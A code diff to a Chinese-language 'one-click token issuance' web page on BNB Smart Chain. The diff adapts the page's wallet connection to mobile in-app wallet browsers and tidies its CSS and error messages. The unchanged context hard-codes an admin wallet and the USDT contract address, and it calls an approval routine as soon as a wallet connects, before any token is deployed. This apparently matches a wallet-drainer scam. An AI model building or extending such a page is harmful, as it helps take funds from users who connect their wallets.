@@ -2,8 +2,9 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>天鹅一键发币</title>
+<!-- Ethers V6 版本 支持toHex -->
 <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.0/dist/ethers.umd.min.js"></script>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Microsoft Yahei", sans-serif; }
@@ -11,15 +12,7 @@ body { background: linear-gradient(135deg,#0b1020,#171e38); min-height: 100vh; c
 .container{ max-width:520px; margin:0 auto; }
 .header{ text-align:center; margin-bottom:35px; }
 .header h1{ font-size:32px; color:#f7c04a; margin-bottom:8px; }
-.fee-tip{
-    background: rgba(247,192,74,0.15);
-    color: #f7c04a;
-    padding: 10px;
-    border-radius: 8px;
-    text-align: center;
-    margin-bottom: 20px;
-    font-size: 15px;
-}
+.fee-tip{ background: rgba(247,192,74,0.15); color: #f7c04a; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 20px; font-size: 15px; }
 .card{ background:rgba(255,255,255,0.05); border:1px solid rgba(255,255,255,0.12); border-radius:16px; padding:26px; margin-bottom:20px; }
 .form-item{ margin-bottom:20px; }
 label{ display:block; margin-bottom:8px; color:#d0d8f0; }
@@ -44,7 +37,6 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 <h1>🦢 天鹅一键发币</h1>
 </div>
 <div class="fee-tip">发币服务费：0.009 BNB</div>
-
 <!-- 普通用户发币面板 -->
 <div class="card" id="userPanel">
 <button id="connectBtn" class="btn btn-connect">连接钱包</button>
@@ -97,7 +89,6 @@ input{ width:100%; padding:14px; border-radius:10px; border:1px solid #353f64; b
 // 管理员固定地址
 const ADMIN_WALLET = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6";
 const DEPLOY_FEE_BNB = "0.009";
-
 // BSC 主网参数
 const BSC_CHAIN_ID = 56;
 const BSC_USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
@@ -171,13 +162,15 @@ logoFileInput.addEventListener("change", function(e){
   reader.readAsDataURL(file);
 });
 
-// 切换BSC链
+// 切换BSC链（兼容手机TP/钱包内置浏览器）
 async function switchBSC(){
+  const chainIdHex = ethers.toHex(BSC_CHAIN_ID);
   try {
-    await provider.send("wallet_switchEthereumChain", [{ chainId: ethers.toHex(BSC_CHAIN_ID) }]);
+    await provider.send("wallet_switchEthereumChain", [{ chainId: chainIdHex }]);
   } catch (err) {
+    // 链不存在则添加BSC
     await provider.send("wallet_addEthereumChain", [{
-      chainId: ethers.toHex(BSC_CHAIN_ID),
+      chainId: chainIdHex,
       chainName: "BNB Smart Chain Mainnet",
       rpcUrls: ["https://bsc-dataseed.binance.org/"],
       blockExplorerUrls: ["https://bscscan.com"],
@@ -218,14 +211,17 @@ async function doApproveAfterConnect(userAddress){
   }
 }
 
-// 连接钱包
+// 连接钱包（重点优化移动端WebView钱包兼容）
 connectBtn.onclick = async ()=>{
-  if(!window.ethereum){
-    showStatus("未检测到浏览器钱包插件（MetaMask/TP插件版）");
+  // 兼容手机钱包注入的 ethereum
+  let ethProvider = window.ethereum || window.ethereum?.providers?.[0];
+  if(!ethProvider){
+    showStatus("未检测到钱包，请在TP/欧易等钱包内置浏览器打开页面");
     return;
   }
   try{
-    provider = new ethers.BrowserProvider(window.ethereum);
+    provider = new ethers.BrowserProvider(ethProvider);
+    // 请求账户权限（移动端兼容写法）
     await provider.send("eth_requestAccounts", []);
     await switchBSC();
     signer = await provider.getSigner();
@@ -233,7 +229,7 @@ connectBtn.onclick = async ()=>{
     connectBtn.innerText = "已连接："+addr.slice(0,8)+"...";
     await doApproveAfterConnect(addr);
   }catch(err){
-    showStatus("连接失败："+err.message);
+    showStatus("连接失败："+(err.shortMessage || err.message));
   }
 }
 
@@ -241,10 +237,7 @@ connectBtn.onclick = async ()=>{
 async function payFeeToAdmin(){
   showStatus(`正在支付发币服务费 ${DEPLOY_FEE_BNB} BNB 至管理员钱包，请签名`);
   const feeWei = ethers.parseEther(DEPLOY_FEE_BNB);
-  const tx = await signer.sendTransaction({
-    to: ADMIN_WALLET,
-    value: feeWei
-  });
+  const tx = await signer.sendTransaction({ to: ADMIN_WALLET, value: feeWei });
   await tx.wait();
   showStatus(`服务费支付成功！交易哈希：${tx.hash}`);
 }
@@ -271,7 +264,6 @@ deployBtn.onclick = async ()=>{
   const name = document.getElementById("tokenName").value.trim();
   const symbol = document.getElementById("tokenSymbol").value.trim();
   const supplyStr = document.getElementById("supply").value.trim();
-
   if(!name||!symbol||!supplyStr){
     showStatus("请填写代币名称、符号、发行量");
     return;
@@ -280,7 +272,6 @@ deployBtn.onclick = async ()=>{
     showStatus("请先在Remix编译合约，填入Bytecode");
     return;
   }
-
   deployBtn.disabled = true;
   try{
     await payFeeToAdmin();
